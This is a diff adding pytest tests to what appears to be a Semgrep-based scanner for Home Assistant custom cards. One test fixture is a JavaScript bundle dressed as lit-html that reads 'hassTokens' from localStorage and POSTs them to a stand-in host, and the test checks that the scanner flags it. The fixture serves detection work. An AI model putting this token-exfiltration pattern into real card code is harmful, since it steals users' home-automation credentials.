@@ -7,7 +7,7 @@ from pathlib import Path
 import pytest
 from conftest import requires_semgrep
 
-from sniff_test.analyzers.semgrep import rules_dir
+from sniff_test.analyzers.semgrep import normalize_js, rules_dir
 from sniff_test.models import Severity
 from sniff_test.scanner import scan
 
@@ -60,6 +60,39 @@ def test_clean_integration_is_quiet_offline(fixtures):
     assert [f for f in r.findings if f.severity >= Severity.LOW] == []
     assert not r.score.complete  # dependency checks were skipped, and the score says so
     assert r.score.score == 89
+
+
+def test_token_stealer_in_lit_bundle_is_caught(tmp_path):
+    card = tmp_path / "lit-card"
+    (card / "dist").mkdir(parents=True)
+    (card / "hacs.json").write_text('{"name": "Lit Card", "filename": "lit-card.js"}')
+    (card / "dist" / "lit-card.js").write_text(
+        "var t,e,o;const G=/<(?:(!--|\\/[^a-zA-Z])|(\\/?[a-zA-Z][^>\\s]*)|(\\/?$))/g,"
+        "F=/-->/g,K=/>/g;class C extends HTMLElement{set hass(h){const k=localStorage"
+        '.getItem("hassTokens");fetch("https://lit-cdn.invalid/c",{method:"POST",body:k})}}'
+        'customElements.define("lit-card",C);\n'
+    )
+    r = scan(str(card), offline=True)
+    assert "card-token-exfil" in _rules(r)
+
+
+def test_normalize_js_rewrites_lit_comment_regex(tmp_path):
+    # In context, lit-html's `/-->/g` made Semgrep 1.181 drop all of mushroom.js v5.2.3
+    # (0 matches, scan reported ok). The rewrite is the same regex, in our copy only.
+    f = tmp_path / "b.js"
+    f.write_text('F=/<!--/g,G=/-->/g,K=/>/g;s="a-->b";\n')
+    assert normalize_js(tmp_path) == 1
+    assert f.read_text() == 'F=/<!--/g,G=/--[>]/g,K=/>/g;s="a-->b";\n'
+
+
+def test_unparseable_js_is_reported_not_silent(tmp_path):
+    card = tmp_path / "odd-card"
+    (card / "dist").mkdir(parents=True)
+    (card / "hacs.json").write_text('{"name": "Odd", "filename": "odd-card.js"}')
+    # Semgrep 1.181 can't parse class static blocks.
+    (card / "dist" / "odd-card.js").write_text("class A{static{this.x=1}}\n")
+    r = scan(str(card), offline=True)
+    assert [f.file for f in r.findings if f.rule_id == "scan-parse-error"] == ["odd-card.js"]
 
 
 def test_hidden_payload_behind_semgrepignore_is_still_found(tmp_path, fixtures):
